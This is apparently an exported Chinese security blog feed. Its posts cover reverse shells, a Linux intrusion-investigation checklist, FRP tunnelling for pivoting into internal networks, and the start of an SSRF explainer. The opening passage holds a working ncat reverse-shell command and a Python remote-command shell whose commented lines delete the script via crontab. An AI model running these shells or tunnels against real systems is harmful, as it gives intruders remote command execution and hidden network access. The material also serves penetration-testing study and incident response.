<li>nc <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat -e cmd.exe 192.168.174.129 8080</span><br></pre></td></tr></table></figure>
也挺好用，就是有时候没有nc，自己传也很麻烦还有诸多限制。</li>
</ol>
</li>
<li>3.python<br>有python环境也可以用python来反弹，相当于用python写了一个nc<br>服务端<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOST=<span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT=<span class="number">1122</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST, PORT)</span><br><span class="line">sock=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(<span class="number">1</span>)</span><br><span class="line">STOP_CHAT=<span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Listening.....&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        STOP_CHAT=(data.decode(<span class="string">&#x27;utf8&#x27;</span>).upper()==<span class="string">&quot;QUIT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> STOP_CHAT:</span><br><span class="line">            <span class="comment">#打扫战场 运用linux定时计划任务一分钟后删除当前脚本文件</span></span><br><span class="line">            <span class="comment">#current_file_path =os.getcwd()+sys.argv[0]</span></span><br><span class="line">            <span class="comment">#os.system(&#x27;echo */1　　*　　*　　*　　*　　rm -rf &#x27;+current_file_path+&#x27; &gt;&gt; /etc/crontab&#x27;)</span></span><br><span class="line">            <span class="comment">#tell_hack = &#x27;Will help you clean war...&#x27;</span></span><br><span class="line">            <span class="comment">#tcpClientSock.sendall(tell_hack.encode(&#x27;utf8&#x27;))</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ME = os.popen(data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        os_result = ME.read()</span><br><span class="line">        <span class="built_in">print</span>(os_result)</span><br><span class="line">        tcpClientSock.sendall(os_result.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
客户端<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TcpClient</span>:</span><br><span class="line">    HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    PORT=<span class="number">1122</span></span><br><span class="line">    BUFSIZ=<span class="number">2048</span></span><br><span class="line">    ADDR=(HOST, PORT)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        self.client.connect(self.ADDR)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=<span class="built_in">input</span>(<span class="string">&#x27;OS Shell &gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.client.send(data.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Execute %s：%s&#x27;</span> %(self.HOST,data))</span><br><span class="line">            <span class="keyword">if</span> data.upper()==<span class="string">&quot;QUIT&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data=self.client.recv(self.BUFSIZ)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Receive：%s&#x27;</span> %(data.decode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    client=TcpClient()</span><br></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4>反弹shell的方法五花八门，最重要的还是找到一个依赖最少的，最稳定的反弹shell的方式。</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>command excution</tag>
      </tags>
  </entry>
  <entry>
    <title>我的博客再次上线</title>
    <url>//posts/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%86%8D%E6%AC%A1%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<pre><code>    第一个博客是大二上学期搭建的，那时候满腔热血，隔几天就要更新一波博客。后来越来越忙，更新越来越少。直到有一天我的服务器和域名都到期了，我觉得没有继续下去的必要了，所以博客下线，我的总结更多的写在了evernote（印象笔记国际版）上。&lt;!-- more --&gt;  

    现在刚入职cfca，工作不算特别忙，翻看我的笔记发现由于没有给别人看的需求，文章写的太乱，排版也很差，现在我自己看起来都费劲。所以，我觉得是时候搭建一个博客来监督我的学习了。  
    之所以选择hexo是因为我目前大多数情况下用markdown，另外博客的本质就是分享内容，越简单越好。另外也不想买域名、服务器。又要续费又要时时维护，很麻烦，所以就搭在github上了。我不想在这些事情上花费太多精力，我只想好好学习，赚点钱，改善生活。嘿嘿。  

    我的博客总体来说就是我的笔记，大部分都是给我自己看的，当然如果文章有错误也欢迎指正。
    立个falg，希望我能每两周能写一篇技术分享。
</code></pre>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>我的云服务器（linux）入侵排查</title>
    <url>//posts/%E6%88%91%E7%9A%84%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>我最近老是感觉自己的阿里云服务器不太安全，因为我是密码登陆的，没配置密钥，我总在甲方的电脑上登陆我的服务器，虽然上面也没啥敏感东西。但是今天有空的时候还是排查了一下，因为心虚。结果是个乌龙，只能说有些东西还没了解过。不过这一过程也重新温习了下我这基础的不能再基础的应急响应能力。🤭</p>
<span id="more"></span>

<h3 id="用户分析"><a href="#用户分析" class="headerlink" title="用户分析"></a>用户分析</h3><p><strong>首先肯定是看有没有非法用户，有没有用户有非法权限</strong><br>通过对 &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow 的查看，发现用户的权限还有用户并没有更改</p>
<p>tips：我一般更改完密码会备份一份&#x2F;etc&#x2F;passwd 然后排查的时候直接diff进行比对，因为用户和服务很多有时候我自己都不清楚.</p>
<p>至于新人，这里给一份这两个文件的详解：</p>
<p>account:password:UID:GID:GECOS:directory:shell<br>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell 注意：无密码只允许本机登陆，远程不允许登陆</p>
<p>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTq wNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0: 99999:7:::<br>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留 </p>
<p><strong>一些常用排查用户的命令</strong><br>last：这个命令可用于查看我们系统的成功登录、关机、重启等情况；这个命令就是将&#x2F;var&#x2F;log&#x2F;wtmp文件格式化输出。<br>lastb：这个命令用于查看登录失败的情况；这个命令就是将&#x2F;var&#x2F;log&#x2F;btmp文件格式化输出。<br>lastlog：这个命令用于查看用户上一次的登录情况；这个命令就是将&#x2F;var&#x2F;log&#x2F;lastlog文件格式化输出。（有的linux没有这个命令）<br>who：这个命令用户查看当前登录系统的情况；这个命令就是将&#x2F;var&#x2F;log&#x2F;utmp文件格式化输出。<br>w：与who命令一致。</p>
<p><strong>权限排查</strong><br>1、查询特权用户特权用户(uid 为0)  [root@localhost ~]# awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd<br>2、查询可以远程登录的帐号信息     [root@localhost ~]# awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow<br>3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”<br>4、禁用或删除多余及可疑的帐号 usermod -L user 禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第 二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将&#x2F;home目录下的 user目录一并删除</p>
<h3 id="历史命令查看"><a href="#历史命令查看" class="headerlink" title="历史命令查看"></a>历史命令查看</h3><p>1、查看root的历史命令 history<br>2、打开 &#x2F;home各帐号目录下的.bash_history，查看普通帐号的历史 命令   cat .bash_history &gt;&gt; history.txt<br>3、历史操作命令的清除：history -c 但此命令并不会清除保存在文件中的记录，因此需要手动删 除.bash_profile文件中的记录。</p>
<p><strong>tips：如何设置详细记录命令？</strong><br>为历史的命令增加登录的IP地址、执行命令时间等信息：<br>1）保存1万条命令 sed -i ‘s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g’ &#x2F;etc&#x2F;profile<br>2）在&#x2F;etc&#x2F;profile的文件尾部添加如下行数配置信息：<br>######jiagu history xianshi#########<br>USER_IP&#x3D;<code>who -u am i 2&gt;/dev/null | awk &#39;&#123;print $NF&#125;&#39; | sed - e &#39;s/[()]//g&#39;</code><br>if [ “$USER_IP” &#x3D; “” ]<br>then USER_IP&#x3D;<code>hostname</code><br>fi export HISTTIMEFORMAT&#x3D;”%F %T $USER_IP <code>whoami</code> “<br>shopt -s histappend<br>export PROMPT_COMMAND&#x3D;”history -a”<br>######### jiagu history xianshi ##########<br>3）source &#x2F;etc&#x2F;profile让配置生效 生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</p>
<h3 id="进程和端口排查"><a href="#进程和端口排查" class="headerlink" title="进程和端口排查"></a>进程和端口排查</h3><p>1、使用 netstat 网络连接命令 分析可疑端口、ip、PID<br>命令：netstat -antlp | more   &#x2F;&#x2F; 直接端口 状态 连接ip 一目了然！<br>2、 进程主要查看有没有高占用、有没有和外部通信、有没有不认识的程序 命令：ps aux</p>
<h3 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h3><table>
<thead>
<tr>
<th>运行级别</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>关机</td>
</tr>
<tr>
<td>1</td>
<td>单用户模式</td>
</tr>
<tr>
<td>2</td>
<td>不完全的命令行模式</td>
</tr>
<tr>
<td>3</td>
<td>完全的命令行模式</td>
</tr>
<tr>
<td>4</td>
<td>系统保留</td>
</tr>
<tr>
<td>5</td>
<td>图形模式</td>
</tr>
<tr>
<td>6</td>
<td>重启动</td>
</tr>
</tbody></table>
<p>查看当前运行击别命令：runlevel<br>系统默认允许级别：vi &#x2F;etc&#x2F;inittab<br>id&#x3D;3：initdefault 系统开机后直接进入哪个运行级别<br>开机启动配置文件<br>&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d<br>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢 在&#x2F;etc&#x2F;init.d目录下，然后在&#x2F;etc&#x2F;rc.d&#x2F;rc*.d中建立软链接即可 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost ~] <span class="built_in">ln</span> -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh </span><br></pre></td></tr></table></figure>
<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加 载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭 的。<br>查看启动项文件一些命令： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/rc.local </span><br><span class="line">more /etc/rc.d/rc[0~6].d   </span><br><span class="line"><span class="built_in">ls</span> -l /etc/rc[0-6].d/</span><br></pre></td></tr></table></figure>
<p>备注：一般在上述文件夹下的服务 程序都需要注意。</p>
<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>基本使用：利用crontab 创建计划任务<br>基本命令：crontab -l 列出某个用户cron服务的详细内容   Tips：默认编写的crontab文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例 如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<br>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)<br>crontab -e 使用编辑器编辑当前的crontab文件<br>使用案例之每天运行&#x2F;home&#x2F;backup.sh脚本：<br>vi &#x2F;etc&#x2F;anacrontab @daily 10 example.daily &#x2F;bin&#x2F;bash &#x2F;home&#x2F;backup.sh<br>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十 分钟之后运行它，而不用再等待 7天。<br>入侵排查 、<br>重点关注以下目录中是否存在恶意脚本 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab </span><br><span class="line">/etc/cron.d/* </span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/* </span><br><span class="line">/etc/cron.weekly/ </span><br><span class="line">/etc/anacrontab </span><br><span class="line">/var/spool/anacron/* </span><br><span class="line"><span class="comment">#小技巧： more /etc/cron.daily/* 查看目录下所有文件</span></span><br></pre></td></tr></table></figure>

<h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><p>** 服务自启动的设置 **<br>第一种修改方法：<br>chkconfig [–level 运行级别] [独立服务名] [on|off]<br>chkconfig –level 2345 httpd on 开启自启动<br>chkconfig httpd on （默认level是2345）<br>第二种修改方法：<br>修改&#x2F;etc&#x2F;re.d&#x2F;rc.local 文件<br>加入 &#x2F;etc&#x2F;init.d&#x2F;httpd start<br>第三种修改方法：<br>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。<br>** 服务的排查 **<br>1、查询已安装的服务<br>RPM 包安装的服务！<br>chkconfig   –list 查看服务自启动状态，可以看到所有的RPM包安装的服务<br>ps aux | grep crond 查看当前服务<br>系统再3与5级别下的启动项<br>2、源码包安装的服务<br>查看服务安装位置，一般实在&#x2F;user&#x2F;local&#x2F;<br>service httpd start<br>搜索&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 查看是否存在！</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>这里是入侵排查最重要的东西，一般有web日志和系统日志，web日志我这里没有，因为我为了安全所有的web都在docker里面，所以我这里主要就是系统日志。而且前面的排查我也没排查出什么东西。</p>
<p>** 日志文件的描述 **<br>日志默认存放位置： &#x2F;var&#x2F;log&#x2F;<br>查看日志配置情况： more &#x2F;etc&#x2F;rsyslog.conf</p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>记录系统定时任务相关日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td>记录系统开机时内核自检信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;message</td>
<td>记录系统重要信息日志，系统出现问题时的首要检查这个日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>记录错误登陆日志，此日志是二进制文件，lastb命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>记录系统种所有用户最后一次登陆事件的日志，二进制文件，lastlog查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>永久记录所有用户的登陆、注销信息，同时记录系统的重启、关机、启动事件。二进制文件，用last查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>记录当前已经登陆的用户信息，只记录房前登陆用户的信息，w 命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>记录验证和授权方面的信息，比如ssh、su、sudo登陆还有添加修改账户密码等，也是应急响应种的重点排查对象</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;auth.log*</td>
<td>同上，ubuntu下的安全日志</td>
</tr>
</tbody></table>
<p>#注意，一个系统可能并不拥有上面表格中的所有日志，比如ubuntu上述日志就有很多没有，这和设置与系统版本有关，所以入侵排排查，应该先确定原来有哪些日志，日志有没有被删除。</p>
<p>** 日志分析技巧 **<br>1、定位有多少IP再爆破主机的root账号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/syslog | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure>
<p>注意 ubuntu 在auth.log 所以可能有的服务器 登陆日志也在auth.log<br>2、定位有哪些ip在爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/syslog | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">注意 ubuntu 在auth.log 所以可能有的服务器 登陆日志也在auth.log</span><br><span class="line">3、爆破用户用的字典是什么</span><br><span class="line">​```bash</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_= &lt;&gt;)&#123; /for(.*?) from/; print&quot;$1\n&quot;;&#125;&#x27;</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure>
<p>注意 ubuntu 在auth.log 所以可能有的服务器 登陆日志也在auth.log<br>4、登陆成功的ip有哪些？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure>
<p>注意 ubuntu 在auth.log 所以可能有的服务器 登陆日志也在auth.log<br>5、登陆成功的日期 用户名 IP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意 ubuntu 在auth.log 所以可能有的服务器 登陆日志也在auth.log<br>6、增加一个用户kali日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali <span class="comment">#grep &quot;useradd&quot; /var/log/secure</span></span><br></pre></td></tr></table></figure>
<p>7、删除一个用户kali日志：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="string">&#x27;kali&#x27;</span> Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span> Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span> <span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br></pre></td></tr></table></figure>
<p>8、sudo授权执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
<h3 id="我的服务器（乌龙）"><a href="#我的服务器（乌龙）" class="headerlink" title="我的服务器（乌龙）"></a>我的服务器（乌龙）</h3><p>重点来了，我做了上述的所有检查，比对&#x2F;etc&#x2F;passwd 没发现变动，cron没有任何新添加的定时任务，服务没有没见过的服务，而且我的web服务全在docker，开机启动项和服务自启动也没有问题。</p>
<p>直到日志排查，我发现一个ip在我出差的时候登陆了我的阿里云，ip定位是石家庄，可我从没去过石家庄，我也不是石家庄的，然后我就开始警觉，查询日志发现该ip没有爆破，一次登陆。震惊！我的密码可是10位大小字母加数字和特殊字符混合出来的。查看历史命令，执行了一个ls，然后就没有了，我刚开始怀疑是他删除了日志和历史命令，于是去查看系统有没有后门，排查了一圈，没有任何服务出网到可疑的ip。</p>
<p>无果后我就问了下一个大佬，他说你的手机是不是河北的，是不是开热点了。于是我发现我虽然不是石家庄的但是我的联通热点的出口是石家庄，那么一切就解释清楚了。哎，白忙活了三个小时。</p>
<p>不过这些基础的排查还是写出来供大家参考吧！其实很多我也是通过网上学习的！</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>服务器安全</tag>
      </tags>
  </entry>
  <entry>
    <title>FRP备忘录</title>
    <url>//posts/frp_bak/</url>
    <content><![CDATA[<h1 id="frp常用功能"><a href="#frp常用功能" class="headerlink" title="frp常用功能"></a>frp常用功能</h1><h2 id="frp穿透配合Proxifier实现内网穿透"><a href="#frp穿透配合Proxifier实现内网穿透" class="headerlink" title="frp穿透配合Proxifier实现内网穿透"></a>frp穿透配合Proxifier实现内网穿透</h2><p>内网穿透常用，一般用来穿透内网进行下一步的渗透。FRP做一层两层穿透确实挺好用的，多层穿透还是直接msf或者nps更方便一点。</p>
<p>服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># 工作台配置，不需要可以不配置</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 服务端地址</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">111.111</span>.<span class="number">111</span>.xxx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socks插件和Proxifier工具实现代理功能</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin123</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网穿透功能  ssh 111.111.111.<span class="doctag">xxx:</span>6000</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure>

<p>nohup后台运行：<br>服务端 frps -c fops.ini<br>客户端 frpc -c frcp.ini</p>
<p>配合Proxifier 即可直接穿透内网</p>
<h2 id="穿透固定web"><a href="#穿透固定web" class="headerlink" title="穿透固定web"></a>穿透固定web</h2><p>Frps.ini修改如下</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">8000</span></span><br><span class="line"><span class="comment"># 用于身份验证，请自行修改</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br></pre></td></tr></table></figure>

<p>frpc.ini 如下</p>
<p>假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 Web 服务对应的端口， 绑定自定义域名 <code>www.yourdomain.com</code></p>
<p>没有域名就直接绑定ip</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># 用于身份验证，请自行修改</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span></span><br><span class="line"><span class="comment"># ip或者域名都可以</span></span><br><span class="line"><span class="attr">custom_domains</span> = www.xxxpass.com </span><br></pre></td></tr></table></figure>

<h2 id="穿透22-SSH"><a href="#穿透22-SSH" class="headerlink" title="穿透22 SSH"></a>穿透22 SSH</h2><p>frps.ini 可以随意只要能启动就行，这里也解释下 其实开哪个端口是由frpc端控制的</p>
<p>Frps.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># 用于身份验证，请自行修改</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br></pre></td></tr></table></figure>

<p>frpc.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = x.x.x.x</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span></span><br><span class="line"><span class="attr">token</span> = xxxpass</span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure>





<h2 id="后续其他备忘待补充"><a href="#后续其他备忘待补充" class="headerlink" title="后续其他备忘待补充"></a>后续其他备忘待补充</h2><p>…………</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF的那些问题</title>
    <url>//posts/SSRF%E7%9A%84%E9%82%A3%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SSRF是非常容易忽略的一个漏洞，我甚至在渗透测试的项目中甚至不会去深究这方面的漏洞，因为它通常危害较小，并且极难利用。但是上次我在一个项目中发现了一个SSRF，并且同服务器还有另一个对内开放的网站，这样这个SSRF就为攻击者建立了一个从对外开放到网站渗透到对内开放的网站。最后利用SSRF探测到了对内开放的那个网站有sql注入，虽然没有getshell，但是还是引起了重视，SSRF在很多时候还是有用武之地的。</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很晦涩！！！举个例子：服务端有一个在线加载图片的功能，你传入一个图片URL，网站就会加载出来对应图片，所以图片的URL是网站服务器去访问的，如果我们利用这点传入一些只有服务端才能进行访问的URL，比如不对外开放的后台地址，那么这个过程就是服务端的请求伪造。</p>
<span id="more"></span>

